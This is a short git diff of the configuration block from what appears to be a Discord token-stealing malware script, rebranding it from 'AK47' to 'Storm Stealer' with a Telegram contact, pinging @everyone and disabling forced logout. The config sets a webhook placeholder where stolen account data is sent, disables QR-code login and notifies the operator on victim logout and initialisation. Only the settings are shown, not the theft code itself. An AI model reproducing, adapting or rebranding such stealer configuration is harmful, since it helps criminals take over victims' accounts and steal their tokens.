@@ -11,21 +11,21 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-  brand: "AK47",
+  brand: "Storm Stealer",
 
   webhook: "%WEBHOOK%",
 
-  logout: true,
+  logout: false,
   disable_qr_code: true,
 
   notify_on_logout: true,
   notify_on_initialization: true,
-  ping: [true, "@doener"],
+  ping: [true, "@everyone"],
 
   embed: {
-      username: "AK47 | https://discord.gg/fPAae7HMcz",
+      username: "Storm Stealer | t.me/stormstealer",
       footer: {
-          text: `AK47 | https://discord.gg/fPAae7HMcz`,
+          text: `Storm Stealer | t.me/stormstealer`,
           icon_url: "https://cdn.discordapp.com/attachments/1084894466017591328/1084895508033699921/imgonline-com-ua-ReplaceColor-xyL8V0SrxU.jpg",
       },
       href: "https://https://discord.gg/fPAae7HMcz",
